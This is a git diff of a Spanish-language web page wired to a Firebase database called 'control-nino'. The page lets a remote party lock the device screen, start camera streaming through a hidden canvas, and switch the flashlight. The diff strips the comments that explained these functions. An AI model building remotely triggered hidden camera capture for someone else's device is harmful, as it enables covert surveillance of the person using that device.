@@ -24,7 +24,6 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // Configuración conectada a tu Firebase real
         const firebaseConfig = {
             databaseURL: "https://control-nino-default-rtdb.firebaseio.com/"
         };
@@ -37,7 +36,6 @@
         const pantallaBloqueo = document.getElementById('bloqueo');
         let transmitiendo = false;
 
-        // --- FUNCIÓN DE DESBLOQUEO REMOTO ---
         db.ref('bloqueo').on('value', (snap) => {
             if (snap.val() === "ACTIVAR") {
                 pantallaBloqueo.style.display = "flex";
@@ -46,7 +44,6 @@
             }
         });
 
-        // --- FUNCIÓN DE VIDEO ---
         function flujoVideo() {
             if (!transmitiendo) return;
             canvas.width = 400;
@@ -64,7 +61,7 @@
                     video.srcObject = s; 
                     transmitiendo = true; 
                     flujoVideo(); 
-                }).catch(err => console.log("Error de cámara:", err));
+                }).catch(err => console.log("Error:", err));
             } else {
                 transmitiendo = false;
                 if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
@@ -72,7 +69,6 @@
             }
         });
 
-        // --- FUNCIÓN DE LINTERNA ---
         db.ref('linterna').on('value', (snap) => {
             const track = video.srcObject ? video.srcObject.getVideoTracks()[0] : null;
             if (track) {
